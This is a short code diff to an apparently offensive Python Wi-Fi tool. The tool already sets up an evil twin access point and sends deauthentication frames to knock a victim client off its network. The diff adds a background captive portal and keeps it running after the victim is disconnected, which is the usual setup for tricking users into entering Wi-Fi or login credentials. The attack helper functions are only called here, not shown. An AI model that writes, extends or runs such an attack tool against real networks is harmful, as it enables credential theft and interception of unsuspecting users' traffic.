@@ -1,5 +1,6 @@
 import time, sys
 import scan, attack
+from threading import Thread
 
 
 def display_networks():
@@ -72,9 +73,22 @@ def main():
                 # Perform attack
                 attack.create_evil_ap(ap_info, iface)
                 attack.deauth_victim({'BSSID': bssid}, client_mac, iface)
+
+                # Launch captive portal in background
+                portal_thread = Thread(target=attack.start_captive_portal, daemon=True)
+                portal_thread.start()
+
+                # Stop packet sniffing (we don't need it now)
                 scan.stop_sniff.set()
                 sniffer.join()
-                sys.exit(0)
+
+                # Keep the main thread alive to serve portal
+                try:
+                    while True:
+                        time.sleep(1)
+                except KeyboardInterrupt:
+                    print("Shutting down captive portal.")
+                    sys.exit(0)
     except KeyboardInterrupt:
         pass
     finally:
